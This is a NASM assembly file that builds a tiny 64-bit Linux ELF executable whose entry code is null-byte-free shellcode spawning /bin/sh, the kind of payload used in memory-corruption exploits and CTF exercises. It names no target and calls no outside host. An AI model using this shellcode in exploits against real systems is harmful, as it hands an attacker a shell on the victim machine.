BITS 64

ehdr:                               ; Elf64_Ehdr
        db  0x7f, "ELF", 2, 1, 1, 0 ; e_ident
times 8 db  0
        dw  3                       ; e_type
        dw  0x3e                    ; e_machine
        dd  1                       ; e_version
        dq  shell                   ; e_entry
        dq  phdr - $$               ; e_phoff
        dq  0                       ; e_shoff
        dd  0                       ; e_flags
        dw  ehdrsize                ; e_ehsize
        dw  phdrsize                ; e_phentsize
        dw  1                       ; e_phnum
        dw  0                       ; e_shentsize
        dw  0                       ; e_shnum
        dw  0                       ; e_shstrndx
ehdrsize  equ  $ - ehdr

phdr:                               ; Elf64_Phdr
        dd  1                       ; p_type
        dd  5                       ; p_flags
        dq  0                       ; p_offset
        dq  $$                      ; p_vaddr
        dq  $$                      ; p_paddr
        dq  filesize                ; p_filesz
        dq  filesize                ; p_memsz
        dq  0x1000                  ; p_align
phdrsize  equ  $ - phdr

shell:
        push 0x68
        mov rax, 0x732f2f2f6e69622f
        push rax
        mov rdi, rsp
        push 0x1010101 ^ 0x6873
        xor dword [rsp], 0x1010101
        xor esi, esi
        push rsi
        push 8
        pop rsi
        add rsi, rsp
        push rsi
        mov rsi, rsp
        xor edx, edx
        push 0x3b
        pop rax
        syscall
filesize  equ  $ - $$
